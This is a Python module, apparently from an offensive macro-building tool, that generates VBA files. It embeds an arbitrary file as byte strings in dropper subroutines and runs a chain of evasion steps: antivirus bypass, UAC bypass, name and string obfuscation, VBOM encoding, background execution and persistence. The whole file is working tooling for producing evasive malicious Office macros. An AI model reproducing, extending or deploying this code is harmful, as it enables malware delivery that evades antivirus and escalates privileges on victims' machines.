#!/usr/bin/env python
# encoding: utf-8

import logging
from modules.mp_generator import Generator
import shutil
import os
from modules.obfuscate_names import ObfuscateNames
from modules.obfuscate_form import ObfuscateForm
from modules.obfuscate_strings import ObfuscateStrings
from modules.uac_bypass import UACBypass
from vbLib import WriteBytes
try:
    from pro_modules.vbom_encode import VbomEncoder
    from pro_modules.persistance import Persistance
    from pro_modules.background import Background
    from pro_modules.av_bypass import AvBypass
    
except:
    pass


class VBAGenerator(Generator):
    """ Module used to generate VBA file from working dir content"""
    
          
    def embedFile(self):
        """
        Embed the content of  self.embeddedFilePath inside the generated target file
        """
        logging.info("   [-] Embedding file %s..." % self.embeddedFilePath)
        if not os.path.isfile(self.embeddedFilePath):
            logging.warning("   [!] Could not find %s! " % self.embeddedFilePath)
            return
        
        infile = open(self.embeddedFilePath, 'rb')
        packedFile = ""
        
        countLine = 0
        countSubs = 1
        line = ""
        packedFile += "Sub DumpFile%d(objFile) \n" % countSubs
            
        while True:
            inbyte = infile.read(1)
            if not inbyte:
                break
            if len(line) > 0:
                line = line + " "
            line = line + "%d" % ord(inbyte)
            if len(line) > 800:
                packedFile += "\tWriteBytes objFile, \"%s\" \n" % line
                line = ""
                countLine += 1
                if countLine > 99:
                    countLine = 0
                    packedFile += "End Sub \n"
                    packedFile += " \n"
                    countSubs += 1
                    packedFile += "Sub DumpFile%d(objFile) \n" % countSubs
                     
        if len(line) > 0:
            packedFile += "\tWriteBytes objFile, \"%s\" \n" % line
            
        packedFile += "End Sub \n"
        packedFile += " \n"
        packedFile += "Sub DumpFile(strFilename) \n"
        packedFile += "\tDim objFSO \n"
        packedFile += "\tDim objFile \n"
        packedFile += " \n"
        packedFile += "\tSet objFSO = CreateObject(\"Scripting.FileSystemObject\") \n"
        packedFile += "\tSet objFile = objFSO.OpenTextFile(strFilename, 2, true) \n"
        for iIter in range(1, countSubs+1):
            packedFile += "\tDumpFile%d objFile \n" % iIter
        packedFile += "\tobjFile.Close \n"
        packedFile += "End Sub \n"
    
        newContent = WriteBytes.VBA + "\n"
        newContent += packedFile + "\n"       
        self.addVBAModule(newContent)
        
        infile.close()
        return 
    
    
        
    def runObfuscators(self):
        """ 
        Call this method to apply transformation and obfuscation on the content of temp directory 
        This method does obfuscation for all VBA and VBA like types
        
        """
        if self.mpSession.mpType == "Pro":
            if self.mpSession.avBypass:
                avBypasser = AvBypass(self.mpSession)
                avBypasser.runPreObfuscation()
            
            # MAcro to run in background    
            if self.mpSession.background:
                transformator = Background(self.mpSession)
                transformator.run() 
        
        # Enable UAC bypass
        if self.mpSession.uacBypass:
            uacBypasser = UACBypass(self.mpSession)
            uacBypasser.run()
        
        # Macro obfuscation
        if self.mpSession.obfuscateNames:
            obfuscator = ObfuscateNames(self.mpSession)
            obfuscator.run()
        # Mask strings
        if self.mpSession.obfuscateStrings:
            obfuscator = ObfuscateStrings(self.mpSession)
            obfuscator.run()
        # Macro obfuscation
        if self.mpSession.obfuscateForm:
            obfuscator = ObfuscateForm(self.mpSession)
            obfuscator.run() 
        if self.mpSession.mpType == "Pro":
                
            # MAcro encoding    
            if self.mpSession.vbomEncode:
                obfuscator = VbomEncoder(self.mpSession)
                obfuscator.run() 
                
                # PErsistance management
                if self.mpSession.persist:
                    obfuscator = Persistance(self.mpSession)
                    obfuscator.run() 
                
                # Macro obfuscation second round
                if self.mpSession.obfuscateNames:
                    obfuscator = ObfuscateNames(self.mpSession)
                    obfuscator.run()
                # Mask strings
                if self.mpSession.obfuscateStrings:
                    obfuscator = ObfuscateStrings(self.mpSession)
                    obfuscator.run()
                # Macro obfuscation
                if self.mpSession.obfuscateForm:
                    obfuscator = ObfuscateForm(self.mpSession)
                    obfuscator.run() 
            else:
                # PErsistance management
                if self.mpSession.persist:
                    obfuscator = Persistance(self.mpSession)
                    obfuscator.run() 
            
            #macro split
            if self.mpSession.avBypass:
                avBypasser = AvBypass(self.mpSession)
                avBypasser.runPostObfuscation()
    
    def check(self):
        return True
    
    def printFile(self):
        """ Display generated code on stdout """
        logging.info(" [+] Generated VB code:\n")
        if len(self.getVBAFiles())==1: 
            vbaFile = self.getMainVBAFile() 
            with open(vbaFile,'r') as f:
                print(f.read())
        else:
            logging.info("   [!] More then one VB file generated")
            for vbaFile in self.getVBAFiles():
                with open(vbaFile,'r') as f:
                    print(" =======================  %s  ======================== " % vbaFile)
                    print(f.read())
                    
    
    def generate(self):
        if len(self.getVBAFiles())>0:
            logging.info(" [+] Analyzing generated VBA files...")
            if len(self.getVBAFiles())==1:
                shutil.copy2(self.getMainVBAFile(), self.outputFilePath)
                logging.info("   [-] Generated VBA file: %s" % self.outputFilePath) 
            else:
                logging.info("   [!] More then one VBA file generated, files will be copied in same dir as %s" % self.outputFilePath)
                for vbaFile in self.getVBAFiles():
                    shutil.copy2(vbaFile, os.path.join(os.path.dirname(self.outputFilePath),os.path.basename(vbaFile)))
                    logging.info("   [-] Generated VBA file: %s" % os.path.join(os.path.dirname(self.outputFilePath),os.path.basename(vbaFile)))   
                    
                    
                